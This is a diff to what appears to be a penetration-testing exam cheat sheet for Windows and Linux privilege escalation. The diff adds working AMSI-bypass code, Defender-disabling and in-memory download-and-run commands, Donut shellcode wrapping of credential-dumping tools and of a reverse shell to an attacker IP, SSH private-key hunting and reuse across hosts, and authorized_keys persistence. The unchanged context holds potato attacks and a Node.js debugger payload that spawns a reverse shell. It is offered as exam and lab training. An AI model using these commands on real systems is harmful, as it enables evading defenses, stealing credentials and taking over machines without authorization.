@@ -484,7 +484,96 @@ net localgroup Administrators
 net users</div>
 <div class="tb"><strong>Tip:</strong> Copy-paste this entire block into your shell as soon as you land. Pipe to a file (<code>cmd /c "ipconfig /all & systeminfo & ..." > C:\\temp\\enum.txt</code>) so you can review it while WinPEAS runs.</div>`},
 
-{step:"02",title:"WinPEAS Panic-Reading Order (9 Priorities)",body:`<div class="wb"><strong>Read WinPEAS output in this priority order. Confirm a condition before exploiting.</strong></div>
+{step:"02",title:"AV Evasion \u2014 Donut Shellcode Wrapping",body:`<div class="wb"><strong>If AV blocks your PE tools</strong> (WinPEAS, ${T.mk}, ${T.shh}, etc), use <a href="https://github.com/thewover/donut" target="_blank">Donut</a> to convert them into position-independent shellcode that runs entirely from memory.</div>
+<h4>Step 1: Quick Bypasses (Try These First)</h4>
+<div class="cb"><span class="cm"># AMSI bypass — run BEFORE any PowerShell tool</span>
+<span class="cm"># Method 1: Zero the amsiContext pointer (kills AMSI for this session)</span>
+$a=[Ref].Assembly.GetTypes()| ? {$_.Name -like "*iUtils"}
+$f=$a.GetFields('NonPublic,Static')| ? {$_.Name -like "*Context"}
+$f.SetValue($null,[IntPtr]::Zero)
+
+<span class="cm"># Method 2: Set amsiInitFailed (alternative if Method 1 is patched)</span>
+$a=[Ref].Assembly.GetTypes()| ? {$_.Name -like "*iUtils"}
+$f=$a.GetFields('NonPublic,Static')| ? {$_.Name -like "*itFailed"}
+$f.SetValue($null,$true)
+
+<span class="cm"># Check if you're in Constrained Language Mode (CLM):</span>
+$ExecutionContext.SessionState.LanguageMode
+<span class="cm"># If "ConstrainedLanguage" — .NET reflection is blocked</span>
+<span class="cm"># AMSI bypass WON'T work. Use pre-compiled .exe tools or Donut-wrapped versions</span></div>
+
+<h4>Step 2: Simple AV Bypass Tricks</h4>
+<div class="cb"><span class="cm"># Rename the binary (bypasses filename-based signatures)</span>
+copy winPEASx64.exe svc_update.exe
+
+<span class="cm"># Run from less-monitored directories</span>
+copy winPEASx64.exe C:\\Windows\\Temp\\svc.exe
+C:\\Windows\\Temp\\svc.exe
+
+<span class="cm"># Download and run in memory (never touches disk as .exe)</span>
+IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')
+
+<span class="cm"># If you have admin, disable Defender (won't work from low-priv)</span>
+Set-MpPreference -DisableRealtimeMonitoring $true</div>
+
+<div class="tb"><strong>Decision Flow:</strong>
+<ol>
+<li>Run AMSI bypass \u2192 try PowerShell tools (IEX download)</li>
+<li>If CLM blocks the bypass \u2192 use pre-compiled .exe tools or Donut-wrapped versions</li>
+<li>If AV catches the exe \u2192 rename it, run from C:\\Windows\\Temp</li>
+<li>If still caught \u2192 wrap with Donut (below)</li>
+<li>If Donut shellcode caught \u2192 add <code>-z 2</code> compression or <code>-e 3</code> encryption</li>
+</ol></div>
+
+<h4>Install Donut on Kali</h4>
+<div class="cb"><span class="ct">pip3 install donut-shellcode</span>
+<span class="cm"># Or build from source:</span>
+git clone https://github.com/TheWover/donut.git && cd donut && make
+<span class="cm"># Binary: ./donut</span></div>
+<h4>Wrap a Native EXE (e.g. WinPEAS, nc.exe)</h4>
+<div class="cb"><span class="cm"># Convert EXE to shellcode (.bin)</span>
+<span class="ct">donut</span> -i winPEASx64.exe -a 2 -o winpeas.bin
+<span class="cm"># -i = input PE file</span>
+<span class="cm"># -a 2 = x64 (use -a 1 for x86, -a 3 for both)</span>
+<span class="cm"># -o = output shellcode file</span>
+
+<span class="cm"># With arguments:</span>
+<span class="ct">donut</span> -i nc.exe -a 2 -p "-e cmd.exe KALI_IP 443" -o nc_rev.bin</div>
+<h4>Wrap a .NET Assembly (e.g. ${T.shh}, Seatbelt)</h4>
+<div class="cb"><span class="cm"># .NET EXE with arguments:</span>
+<span class="ct">donut</span> -i ${T.shh}.exe -a 2 -p "-c All" -o sharphound.bin
+
+<span class="cm"># .NET DLL (specify class + method):</span>
+<span class="ct">donut</span> -i Seatbelt.dll -a 2 -c Seatbelt.Program -m Main -p "-group=all" -o seatbelt.bin</div>
+<h4>Execute the Shellcode on Target</h4>
+<div class="cb"><span class="cm"># Transfer .bin to target (certutil / iwr / SMB)</span>
+
+<span class="cm"># Primary: Donut thread injection (runs in-process, no loader needed)</span>
+<span class="ct">donut</span> -i winPEASx64.exe -a 2 -x 2 -o winpeas.bin
+<span class="cm"># -x 2 = run shellcode in a new thread (exits thread when done)</span>
+<span class="cm"># -x 1 = exit the host process when done (default)</span>
+
+<span class="cm"># Then transfer and run the .bin via PowerShell:</span>
+<span class="cm"># Host .bin on Kali, download + execute in memory with a simple loader</span>
+<span class="cm"># Or inject into a running process using your C2 framework</span></div>
+<h4>Quick Reference: Common Tool Wrapping</h4>
+<table>
+<tr><th>Tool</th><th>Donut Command</th></tr>
+<tr><td>WinPEAS</td><td><code>donut -i winPEASx64.exe -a 2 -o wp.bin</code></td></tr>
+<tr><td>${T.shh}</td><td><code>donut -i ${T.shh}.exe -a 2 -p "-c All" -o sh.bin</code></td></tr>
+<tr><td>${T.mk}</td><td><code>donut -i ${T.mk}.exe -a 2 -p "sekurlsa::logonpasswords exit" -o mk.bin</code></td></tr>
+<tr><td>Seatbelt</td><td><code>donut -i Seatbelt.exe -a 2 -p "-group=all" -o sb.bin</code></td></tr>
+<tr><td>${T.rub}</td><td><code>donut -i ${T.rub}.exe -a 2 -p "kerberoast" -o rb.bin</code></td></tr>
+</table>
+<div class="tb"><strong>Tips:</strong>
+<ul>
+<li>Always match architecture: <code>-a 2</code> for x64 targets, <code>-a 1</code> for x86</li>
+<li>If Donut shellcode is still caught, try: <code>-z 2</code> (aPLib compression) or <code>-e 3</code> (random key encryption)</li>
+<li>Combine with <code>IEX(New-Object Net.WebClient).DownloadString()</code> to load the runner without touching disk</li>
+<li>As a last resort: run tools from <code>C:\\Windows\\Temp</code> (less AV scanning) or rename the binary</li>
+</ul></div>`},
+
+{step:"03",title:"WinPEAS Panic-Reading Order (9 Priorities)",body:`<div class="wb"><strong>Read WinPEAS output in this priority order. Confirm a condition before exploiting.</strong></div>
 <table>
 <tr><th>#</th><th>What to Check</th><th>What It Means</th></tr>
 <tr><td>1</td><td>User, groups, integrity, privileges</td><td>Decide: low user, admin+UAC, or service account</td></tr>
@@ -510,7 +599,7 @@ systeminfo > target-systeminfo.txt
 <span class="ct">pwsh</span> ./windows-exploit-suggester-standalone.ps1 <span class="cf">-SysteminfoFile</span> ./target-systeminfo.txt <span class="cf">-CveOnly</span></div>
 <div class="tb"><strong>Tip:</strong> windows-exploit-suggester checks 115+ CVEs (KiTrap0D through CLFS), AlwaysInstallElevated, unquoted paths, writable services/binaries, writable PATH dirs, UAC state, stored creds, and abusable token privileges. Options: -CveOnly, -MisconfigOnly, -ShowAll.</div>`},
 
-{step:"03",title:"SeImpersonatePrivilege (Potato Attacks)",body:`<div class="cb"><span class="ct">whoami</span> <span class="cf">/priv</span></div>
+{step:"04",title:"SeImpersonatePrivilege (Potato Attacks)",body:`<div class="cb"><span class="ct">whoami</span> <span class="cf">/priv</span></div>
 <p>If <strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong> is present (even "Disabled"), you can escalate to SYSTEM.</p>
 <span class="tt pe">GodPotato</span> <span class="tt pe">PrintSpoofer</span> <span class="tt pe">JuicyPotato</span> <span class="tt pe">SigmaPotato</span>
 <div class="cb"><span class="cm"># 1. GodPotato (broadest compatibility)</span>
@@ -536,7 +625,7 @@ systeminfo > target-systeminfo.txt
 <tr><td>SeTakeOwnership</td><td>Take ownership of files/services</td></tr>
 </table>`},
 
-{step:"04",title:"Service Binary Hijack (XAMPP/Apache)",body:`<h4>Find Vulnerable Services</h4>
+{step:"05",title:"Service Binary Hijack (XAMPP/Apache)",body:`<h4>Find Vulnerable Services</h4>
 <div class="cb"><span class="ct">Get-CimInstance</span> -ClassName win32_service | Select Name,State,PathName
 <span class="cm"># Check permissions on service binary:</span>
 <span class="ct">icacls</span> "C:\\path\\to\\service.exe"
@@ -567,7 +656,7 @@ systeminfo > target-systeminfo.txt
 <span class="cm"># If a service/task calls a binary without full path and a PATH dir is writable,</span>
 <span class="cm"># plant a payload binary with the same name in that directory</span></div>`},
 
-{step:"05",title:"Stored Credentials, History & Registry",body:`<h4>cmdkey / runas /savecred</h4>
+{step:"06",title:"Stored Credentials, History & Registry",body:`<h4>cmdkey / runas /savecred</h4>
 <div class="cb"><span class="ct">cmdkey</span> <span class="cf">/list</span>
 <span class="cm"># If saved creds exist:</span>
 <span class="ct">runas</span> <span class="cf">/savecred /user:</span>&lt;USER&gt; "C:\\temp\\rev.exe"</div>
@@ -619,9 +708,33 @@ dir C:\\ /s /b *.kdbx 2>nul
 <span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt</div>
 <h4>WiFi Passwords</h4>
 <div class="cb"><span class="ct">netsh wlan show profiles</span>
-<span class="ct">netsh wlan show profile</span> name="&lt;NETWORK&gt;" key=clear</div>`},
+<span class="ct">netsh wlan show profile</span> name="&lt;NETWORK&gt;" key=clear</div>
+<h4>SSH Keys on Windows</h4>
+<div class="cb"><span class="cm"># Check for SSH keys in user profiles</span>
+dir C:\\Users\\*\\.ssh\\ /s /b 2>nul
+type C:\\Users\\&lt;user&gt;\\.ssh\\id_rsa
+type C:\\Users\\&lt;user&gt;\\.ssh\\known_hosts
+type C:\\Users\\&lt;user&gt;\\.ssh\\authorized_keys
 
-{step:"06",title:"DLL Hijack, Scheduled Tasks, UAC Bypass",body:`<h4>DLL Hijacking Triage</h4>
+<span class="cm"># Copy id_rsa to Kali, then:</span>
+chmod 600 id_rsa
+ssh -i id_rsa &lt;user&gt;@&lt;TARGET_IP&gt;
+
+<span class="cm"># If key has Windows line endings (ssh refuses it):</span>
+dos2unix id_rsa
+<span class="cm"># Or: sed -i 's/\\r$//' id_rsa</span>
+
+<span class="cm"># If passphrase-protected:</span>
+<span class="ct">ssh2john</span> id_rsa > ssh_hash.txt
+<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
+
+<span class="cm"># Key could belong to ANOTHER user or machine — try everywhere:</span>
+ssh -i id_rsa root@$IP
+ssh -i id_rsa admin@$IP
+ssh -i id_rsa &lt;found_username&gt;@&lt;OTHER_BOX_IP&gt;</div>
+<div class="tb"><strong>Tip:</strong> SSH keys found on Windows boxes often unlock OTHER machines in the exam. Check <code>known_hosts</code> for target IPs. Also check <code>C:\\ProgramData\\ssh\\</code> for the host's own keys and <code>administrators_authorized_keys</code>.</div>`},
+
+{step:"07",title:"DLL Hijack, Scheduled Tasks, UAC Bypass",body:`<h4>DLL Hijacking Triage</h4>
 <div class="cb"><span class="cm"># Identify DLL candidates from Kali</span>
 <span class="ct">strings -e l</span> executable.exe | grep -i '.dll'
 
@@ -640,7 +753,7 @@ dir C:\\ /s /b *.kdbx 2>nul
 <span class="ct">whoami</span> /groups | findstr /i "mandatory"
 <span class="cm"># If Medium + in Administrators group: use UACME or fodhelper bypass</span></div>`},
 
-{step:"07",title:"Node.js Debugger Exploitation",body:`<p>Check if a Node.js debugger (port 9229/9230/9231) runs as a privileged user:</p>
+{step:"08",title:"Node.js Debugger Exploitation",body:`<p>Check if a Node.js debugger (port 9229/9230/9231) runs as a privileged user:</p>
 <div class="cb"><span class="ct">netstat</span> -ano | findstr "9229"
 <span class="ct">curl</span> http://127.0.0.1:9229/json</div>
 <p>If it returns JSON with <code>webSocketDebuggerUrl</code>, you can execute code as that user via ChromeDevTools protocol.</p>
@@ -652,7 +765,7 @@ dir C:\\ /s /b *.kdbx 2>nul
   "expression":"require('child_process').exec('cmd /c C:\\\\temp\\\\nc.exe &lt;KALI&gt; 443 -e cmd.exe')",
   "includeCommandLineAPI":true}}</div>`},
 
-{step:"08",title:"Automated Enumeration & Proof",body:`<div class="cb"><span class="cm"># PrivescCheck</span>
+{step:"09",title:"Automated Enumeration & Proof",body:`<div class="cb"><span class="cm"># PrivescCheck</span>
 <span class="ct">powershell -ep bypass -File</span> .\\PrivescCheck.ps1
 
 <span class="cm"># PowerUp</span>
@@ -983,15 +1096,35 @@ find / -iname '*.kdbx' 2>/dev/null
 <span class="cm"># Or:</span>
 <span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt</div>
 <h4>SSH Key Handling</h4>
-<div class="cb"><span class="cm"># Found id_rsa? Copy to Kali:</span>
+<div class="cb"><span class="cm"># Search for SSH keys everywhere</span>
+find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
+find / -name authorized_keys 2>/dev/null
+<span class="cm"># Check known_hosts for other targets:</span>
+cat /home/*/.ssh/known_hosts 2>/dev/null
+
+<span class="cm"># Found id_rsa? Copy to Kali:</span>
 chmod 600 id_rsa
 ssh -i id_rsa &lt;user&gt;@$IP
-<span class="cm"># Fix formatting if broken:</span>
-sed -i 's/\\r$//' id_rsa</div>
+
+<span class="cm"># Fix Windows line endings if copied from a Windows box:</span>
+dos2unix id_rsa
+<span class="cm"># Or: sed -i 's/\\r$//' id_rsa</span>
+
+<span class="cm"># Permission error "too open"? Must be exactly 600:</span>
+chmod 600 id_rsa    <span class="cm"># NOT 644, NOT 700</span>
+
+<span class="cm"># Try the key on other users and machines:</span>
+ssh -i id_rsa root@$IP
+ssh -i id_rsa &lt;user&gt;@&lt;OTHER_BOX_IP&gt;</div>
 <h4>SSH Key Passphrase Cracking</h4>
 <div class="cb"><span class="cm"># If ssh -i id_rsa asks for passphrase, crack it first:</span>
 <span class="ct">ssh2john</span> id_rsa > ssh_hash.txt
-<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</div>
+<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
+
+<span class="cm"># Write your own key for persistence:</span>
+ssh-keygen -t rsa -N "" -f ./mykey
+cat mykey.pub >> /home/&lt;user&gt;/.ssh/authorized_keys
+ssh -i mykey &lt;user&gt;@$IP</div>
 <h4>Writable /etc/passwd</h4>
 <div class="cb"><span class="ct">ls -la /etc/passwd</span>
 <span class="cm"># If writable:</span>
